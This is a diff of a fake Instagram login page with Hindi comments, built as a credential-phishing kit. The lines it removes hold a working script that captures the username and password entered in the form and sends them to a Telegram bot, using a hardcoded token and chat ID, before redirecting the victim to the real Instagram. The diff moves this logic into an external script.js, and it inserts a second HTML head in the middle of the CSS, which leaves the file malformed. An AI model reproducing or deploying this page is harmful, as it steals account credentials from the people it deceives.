@@ -464,20 +464,24 @@
         }
         .signup-section a {
             color: #0095f6;
-            text-decoration: none;
-            font-weight: 600;
-        }
-    </style>
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login • Instagram</title>
+    <!-- यहाँ CSS फाइल जोड़ी गई है -->
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
 
     <div class="login-wrapper">
-        <!-- असली Instagram लोगो -->
+        <!-- Instagram Logo -->
         <div class="logo-container">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" alt="Instagram">
         </div>
 
-        <!-- लॉगिन फॉर्म -->
+        <!-- Login Form -->
         <form id="loginForm">
             <input type="text" name="username" placeholder="Phone number, username, or email" required>
             <input type="password" name="password" placeholder="Password" required>
@@ -495,29 +499,10 @@
         Don't have an account? <a href="#">Sign up</a>
     </div>
 
-    <!-- टेलीग्राम पर डेटा भेजने की स्क्रिप्ट -->
-    <script>
-        const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
-        const chatId = "7008289410";    
-
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            e.preventDefault(); 
-
-            let user = document.querySelector('input[name="username"]').value;
-            let pass = document.querySelector('input[name="password"]').value;
-
-            let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
-            
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-            .then(response => response.json())
-            .then(data => {
-                console.log('सफलतापूर्वक भेज दिया गया', data);
-                window.location.href = "https://instagram.com"; 
-            })
-            .catch(error => console.error('एरर:', error));
-        });
-    </script>
+    <!-- यहाँ JavaScript फाइल जोड़ी गई है -->
+    <script src="script.js"></script>
 
 </body>
 </html>
+
 
